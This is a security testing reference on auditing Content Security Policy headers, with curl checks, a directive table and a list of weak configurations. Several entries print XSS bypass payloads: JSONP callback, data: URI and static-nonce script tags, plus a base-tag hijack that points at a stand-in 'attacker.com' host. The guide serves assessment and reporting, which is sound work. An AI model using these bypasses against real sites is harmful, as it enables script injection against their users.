# Content Security Policy (CSP) Validation

## What is CSP?
HTTP header that controls which resources (scripts, styles, images) a page can load.
A strong CSP can prevent XSS exploitation even when injection exists.

## Checking CSP
```bash
# Via curl
curl -sI "http://target/" | grep -i "content-security-policy"

# Via browser DevTools
# Console → document.querySelector('meta[http-equiv="Content-Security-Policy"]')
# Or Network tab → Response headers
```

## CSP Directives Reference
| Directive | Controls | XSS Impact |
|-----------|----------|------------|
| `script-src` | JavaScript loading/execution | CRITICAL — blocks XSS if restrictive |
| `default-src` | Fallback for all directives | Blocks everything not explicitly allowed |
| `style-src` | CSS loading | CSS injection for data theft |
| `img-src` | Image loading | Affects data exfiltration via image |
| `connect-src` | fetch/XHR/WebSocket | Blocks data exfiltration channels |
| `base-uri` | `<base>` tag | Base tag hijacking |
| `form-action` | Form submissions | Credential theft via forms |
| `frame-ancestors` | Who can embed (clickjacking) | — |

## Vulnerable CSP Configurations

### `unsafe-inline` Present
```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```
**Impact:** All inline XSS works normally. CSP provides NO XSS protection.

### `unsafe-eval` Present
```
Content-Security-Policy: script-src 'self' 'unsafe-eval'
```
**Impact:** `eval()`, `setTimeout(string)`, `Function(string)` all work.

### Wildcard or Broad Domains
```
Content-Security-Policy: script-src *
Content-Security-Policy: script-src *.cloudflare.com
```
**Impact:** Load scripts from any domain (or any cloudflare subdomain).

### CDN with JSONP Endpoints
```
Content-Security-Policy: script-src cdn.example.com
```
**Bypass:** `<script src="https://cdn.example.com/jsonp?callback=alert(1)//"></script>`

### data: URIs Allowed
```
Content-Security-Policy: script-src 'self' data:
```
**Bypass:** `<script src="data:text/javascript,alert(1)"></script>`

### Missing `base-uri`
```
Content-Security-Policy: script-src 'self'
(no base-uri directive)
```
**Bypass:** `<base href="https://attacker.com/">` → relative script paths load from attacker

### Nonce-Based CSP with Reuse
```
Content-Security-Policy: script-src 'nonce-abc123'
```
If nonce is static/predictable: `<script nonce="abc123">alert(1)</script>`

## CSP Evaluation Tools
```bash
# Google CSP Evaluator
# https://csp-evaluator.withgoogle.com/

# Check CSP in response
curl -sI URL | grep -i "content-security-policy" | tr ';' '\n'
```

## Reporting in Findings
When documenting XSS, always include:
- Whether CSP is present (header value)
- Whether CSP blocks the XSS payload
- Specific weakness in CSP if bypassable
- Recommendation for CSP improvement
